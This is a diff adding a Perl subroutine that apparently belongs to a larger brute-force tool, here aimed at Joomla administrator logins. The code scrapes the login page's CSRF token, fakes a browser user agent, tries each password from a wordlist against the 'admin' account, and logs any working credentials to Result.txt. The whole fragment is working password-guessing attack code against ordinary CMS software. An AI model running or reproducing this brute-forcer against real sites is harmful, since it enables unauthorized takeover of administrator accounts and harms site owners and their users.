@@ -284,3 +284,59 @@ next OUTER;
 }
 }
 }
+
+###### Joomla #######
+sub joomla{
+$joomsite = $site . '/administrator/index.php';
+
+$ua = LWP::UserAgent->new(keep_alive => 1);
+$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
+$ua->timeout (30);
+$ua->cookie_jar(
+        HTTP::Cookies->new(
+            file => 'mycookies.txt',
+            autosave => 1
+        )
+    );
+
+
+$getoken = $ua->get($joomsite)->content;
+if ( $getoken =~ /name="(.*)" value="1"/ ) {
+$token = $1 ;
+}else{
+print color('bold red'),"\n [";
+print color('bold green'),"x";
+print color('bold red'),"] ";
+print color('bold white'),"Can't Grabb Joomla Token !\n";
+next OUTER;
+}
+
+print color('bold red'),"\n [";
+print color('bold green'),"-";
+print color('bold red'),"] ";
+print color('bold white'),"Starting brute force\n";
+open(a,"<$pass") or die "$!";
+while(<a>){
+chomp($_);
+$joomuser = admin;
+$joompass = $_;
+print color('bold red'),"\n [";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Trying: $joompass ";
+$joomlabrute = POST $joomsite, [username => $joomuser, passwd => $joompass, lang =>en-GB, option => user_login, task => login, $token => 1];
+$response = $ua->request($joomlabrute);
+
+my $check = $ua->get("$joomsite")->content;
+if ($check =~ /logout/){
+print color('bold white'),"- ";
+print color('bold green'),"FOUND\n";
+print color('reset');
+
+open (TEXT, '>>Result.txt');
+print TEXT "$joomsite => User: $joomuser Pass: $joompass\n";
+close (TEXT);
+next OUTER;
+}
+}
+}
